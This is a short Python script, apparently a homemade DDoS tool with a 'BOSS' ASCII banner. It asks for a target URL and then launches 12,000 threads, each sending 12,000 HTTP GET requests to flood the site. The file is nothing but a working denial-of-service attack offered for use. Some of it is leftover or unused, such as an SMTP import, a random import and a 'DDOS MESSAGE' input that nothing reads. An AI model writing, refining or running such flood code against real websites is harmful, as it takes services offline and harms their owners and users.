import smtplib
import requests
import threading
import random
import os
os.system("clear")
banner=("""\33[31m
$$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
$$ |  $$ |$$ /  $$ |$$ /  \__|$$ /  \__|
$$$$$$$\ |$$ |  $$ |\$$$$$$\  \$$$$$$\  
$$  __$$\ $$ |  $$ | \____$$\  \____$$\ 
$$ |  $$ |$$ |  $$ |$$\   $$ |$$\   $$ |
$$$$$$$  | $$$$$$  |\$$$$$$  |\$$$$$$  |
\_______/  \______/  \______/  \______/ 
                                        
                                        
                                   
\33[0m""")
print(banner)
url=input("Site link  : ")
mesaj=input("DDOS MESSAGE: ")
print("START")
print("DDOS STARTED")
def ch():
    for i in range(12000):
        try:
            x = requests.get(url)
        except:
                print(f"Hata")
for i in range(12000):
    ta = threading.Thread(target=ch)
    ta.start()